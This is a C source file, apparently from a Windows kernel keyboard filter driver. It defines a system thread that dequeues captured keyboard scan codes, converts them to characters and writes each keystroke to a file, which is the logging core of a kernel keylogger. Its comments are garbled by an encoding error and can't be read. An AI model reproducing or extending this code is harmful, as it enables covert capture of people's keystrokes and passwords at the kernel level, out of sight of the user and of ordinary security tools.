#include "common.h"
#include "KWrite.h"
#include "ScanCode.h"
extern long g_PendingWrite ;
NTSTATUS InitWriteFileThread(PDRIVER_OBJECT pDriverObject)
//��ʼ���ļ�д���߳�ʱ����Ҫ�ر��̵߳�handle��������̵߳�Objectֵ��
//���ر��߳�ʱ�ȴ�
{
	HANDLE hThread;
	NTSTATUS Status ;
	PDEVICE_EXTIONSION pDeviceKeyboardDeviceExtension = 
		(PDEVICE_EXTIONSION)pDriverObject->DeviceObject->DeviceExtension;
	Status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, WriteFileThread, (PVOID)pDeviceKeyboardDeviceExtension);
	if (!NT_SUCCESS(Status))
	{//BUG:����̴߳���ʧ�ܣ��豸���ᱻ�ر�
		;
	}
	else
	{
		ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pDeviceKeyboardDeviceExtension->pThreadObj, NULL);
	}
	ZwClose(hThread);
	return Status;
}
VOID WriteFileThread(PVOID Context)
{
	PDEVICE_EXTIONSION pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)Context;
	PKEY_DATA pkData;
	char keys[3] = {0};
	PLIST_ENTRY pListEntry;
	while (true)
	{
		KeWaitForSingleObject(&pKeyboardDeviceExtension->sem, Executive, KernelMode, false, NULL);
		if (pKeyboardDeviceExtension->bThreadTerminate == true)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}
		
		pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->MessageList, &pKeyboardDeviceExtension->kLock);
		pkData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
		//ConvertScanCodeToKeyCode����������keys[0],�������洢���ⰴ��
		ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, pkData, keys);
		if(keys[0] != 0)
		{
			if (pKeyboardDeviceExtension->hFile != NULL)
			{
				IO_STATUS_BLOCK ioStatus;
				ZwWriteFile(pKeyboardDeviceExtension->hFile, NULL, NULL, NULL ,&ioStatus, keys, strlen(keys), 0, NULL);
			}
		}
		ExFreePool(pkData);
	}
	return ;
}